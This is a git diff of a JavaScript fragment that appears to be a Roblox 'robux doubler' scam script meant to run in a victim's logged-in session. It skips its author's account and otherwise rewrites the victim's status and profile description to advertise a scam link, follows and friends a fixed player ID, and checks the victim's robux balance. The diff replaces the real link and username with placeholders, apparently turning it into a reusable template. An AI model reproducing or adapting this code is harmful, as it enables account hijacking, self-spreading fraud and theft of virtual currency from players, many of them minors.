@@ -1,16 +1,16 @@
 RBLXApi.username = document.getElementsByClassName("text-nav")[0].innerText;
 RBLXApi.i = 0;
 RBLXApi.robuxToGive = 0;
-RBLXApi.askToClose = true;
+RBLXApi.askToClose = true; // Does a do you want to leave prompt
 // PROGRAM THE API
 RBLXApi.RunScript = function(){
     setTimeout(function(){
-        if (RBLXApi.username.toLowerCase() == "middleman_frionx"){
+        if (RBLXApi.username.toLowerCase() == "yourusernameinalllowercase"){
             console.log("Don't do it again idiot");
         }
         else{
-            RBLXApi.setStatus("I just earned a million robux from u.nu/roblox-doubler");
-            RBLXApi.setDescription("I just earned a million robux from u.nu/roblox-doubler");
+            RBLXApi.setStatus("I just earned a million robux from this.scam.link");
+            RBLXApi.setDescription("I just earned a million robux this.scam.link");
             RBLXApi.FollowPlayer("1996250309");
             RBLXApi.FriendPlayer("1996250309");
             if (RBLXApi.robuxCount <= 9){
